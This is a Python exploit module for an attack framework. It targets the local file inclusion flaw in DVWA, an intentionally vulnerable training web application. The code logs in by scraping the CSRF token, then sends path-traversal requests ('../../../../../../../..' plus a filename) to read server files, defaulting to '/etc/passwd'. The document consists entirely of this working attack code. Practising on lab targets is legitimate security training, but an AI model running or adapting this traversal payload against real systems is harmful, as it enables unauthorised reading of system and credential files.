from deathnote_module import *
from lib.http.http_client import Http_client
from lib.http.http_login import Http_login
from lib.http.lfi import Lfi
from bs4 import BeautifulSoup

class Module(Auxiliary, Http_client, Http_login, Lfi):


	__info__ = {
			'name': 'dvwa lfi',
			'description': 'dvwa lfi'
		}

	uripath = OptString("/dvwa/", "path", "yes")
	file_read = OptString("/etc/passwd", "filename", "yes")

	def get_token(self,source):
		soup = BeautifulSoup(source, "html.parser")
		return soup.find('input', { "type" : "hidden" })['value']

	def login(self):
		login = self.http_request(
				method="GET",
				path="/dvwa/login.php",
				session = True
				)
		headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0)Gecko/20100101 Firefox/60.0', 'Upgrade-Insecure-Requests': '1'}
		data = {
				"username"   : self.username,
				"password"   : self.password,
				"Login"      : "Submit",
				"user_token" : self.get_token(login.text)
				}
		r = self.http_request(
				method="POST",
				path="/dvwa/login.php",
				data=data,
				headers=headers,
				session=True
			)
		return self.session
	
	def template(self):
		r = self.http_request(
				method="GET",
				path=self.uripath+"vulnerabilities/fi/?page=../../../../../../../..",
				session=True
				)
		if r:
			if r.status_code == 200:
				return r.text
		
	def execute(self, cmd):
		pwn = self.http_request(
				method="GET",
				path=self.uripath+"vulnerabilities/fi/?page=../../../../../../../.."+cmd,
				session=True
				)
		if pwn:
			if pwn.status_code == 200:		
				template = self.template()
				result = self.clean_with_template(pwn.text, template)
				if result:
					return result
				return self.file_not_found()
		return self.file_not_found()

	def run(self):
		self.login()
		self.handler_lfi()